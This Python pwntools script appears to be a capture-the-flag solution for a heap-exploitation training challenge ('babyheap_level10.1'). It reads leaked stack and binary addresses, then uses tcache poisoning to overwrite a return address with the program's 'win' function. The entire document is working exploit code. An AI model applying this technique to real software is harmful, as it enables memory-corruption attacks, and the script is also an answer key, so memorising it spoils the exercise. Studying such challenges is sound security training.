from pwn import *

p = process("/challenge/babyheap_level10.1")
binary = ELF("/challenge/babyheap_level10.1")

def malloc_to_1(loc:bytes):
    p.sendline(b'malloc')
    p.sendline(b'0')
    p.sendline(b'100')
    p.sendline(b'malloc')
    p.sendline(b'1')
    p.sendline(b'100')
    p.sendline(b'free')
    p.sendline(b'0')
    p.sendline(b'free')
    p.sendline(b'1')

    p.sendline(b'scanf')
    p.sendline(b'1')
    p.recv()
    p.sendline(loc)
    p.sendline(b'malloc')
    p.sendline(b'2')
    p.sendline(b'100')
    p.sendline(b'malloc')
    p.sendline(b'1')
    p.sendline(b'100')

def scanf_to_pos(buf:bytes, pos:bytes):
    p.sendline(b'scanf')
    p.sendline(pos)
    p.recv()
    p.sendline(buf)
    p.recv()

p.recvuntil(b'LEAK')
p.recvuntil(b'at: ')
stack_leak = p.recvuntil(b'.')[:-1]
ret_addr = int(stack_leak, 16) + 0x118

p.recvuntil(b'LEAK')
p.recvuntil(b'at: ')
main_leak = p.recvuntil(b'.')[:-1]
binary_base = int(main_leak, 16) - binary.sym.main
binary.address = binary_base

malloc_to_1(p64(ret_addr))
scanf_to_pos(p64(binary.sym.win), b'1')
p.sendline(b'quit')

p.interactive()

